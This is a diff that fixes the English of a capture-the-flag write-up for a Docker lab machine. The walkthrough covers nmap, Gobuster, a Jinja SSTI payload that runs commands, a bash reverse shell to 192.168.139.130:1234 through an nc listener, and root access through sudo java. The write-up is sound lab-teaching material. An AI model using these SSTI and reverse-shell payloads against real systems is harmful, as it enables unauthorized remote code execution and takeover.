@@ -18,7 +18,7 @@ PORT   STATE SERVICE REASON
 
 ## Examining ports
 
-We are going to explore who is the version in this service, For it we execute this comand:
+We are going to explore the version of this service. For this, we execute the following command:
 
 ```ruby
 nmap -sCV -p5000 172.17.0.2 
@@ -29,16 +29,16 @@ we obtain this dataset:
 
 ## Analyzing web page
 
-if we enter to the web page we obtain the folowing:
+When we enter the web page, we obtain the following:
 
-it look like a formulary create with `Jinja`.
+It looks like a form created with `Jinja`.
 ![alt text](Imagenes/Pingu_2.png)
 
-we can eccxcute html inyecction to verify if it has some filter.
+We can execute HTML injection to verify if it has any filters.
 ![alt text](Imagenes/Pingu_3.png)
 
-If we search some directory in another site with Gobuster tool , we find `/console`
-we need a password to access the console.
+If we search for directories on the site with the Gobuster tool, we find `/console`
+We need a password to access the console.
 ![alt text](Imagenes/Pingu_4.png)
 
 
@@ -46,29 +46,32 @@ we need a password to access the console.
 
 We can try to access with `SSTI (Server Side Template Injection)`
 
-We can run some comand to excute a SSTI like this:
+We can run a command to execute an SSTI like this:
 
 ```ruby
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-
 ```
+
 we obtain:
 
 ![alt text](Imagenes/Pingu_5.png)
 
-succefully, we obtain response of the server who is our user.
+Successfully, we obtain a response from the server showing our user.
 
 Now we are going to prepare the reverse shell to connect with us.
 
-Firstly we need to use nc tool:
+First, we need to use the nc tool:
+
 ```ruby
 nc -lvnp 1234
 ```
-we can exploit with following comands:
+
+We can exploit with the following command:
 
 ```ruby
 {{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.139.130/1234 0>&1"').read()}}
 ```
+
 ![alt text](Imagenes/Pingu_6.png)
 
 
@@ -114,7 +117,7 @@ User pinguinazo may run the following commands on 17eb54554e98:
 
 ```
 
-We can see that we can execute the script in java, so we can try to file to spawn a shell with root privileges.
+We can see that we can execute Java scripts, so we can try to create a file to spawn a shell with root privileges.
 
 Therefore, we need to edit the script with the following code:
 
@@ -135,7 +138,8 @@ public class shell {
 Now, we are able to spawn a shell with root privileges if we execute the following:
 
 ```ruby
-sudo java Exploit.java
+sudo java shell
 ```
+
 ![alt text](Imagenes/Pingu_8.png)
 ![alt text](Imagenes/Pingu_9.png)
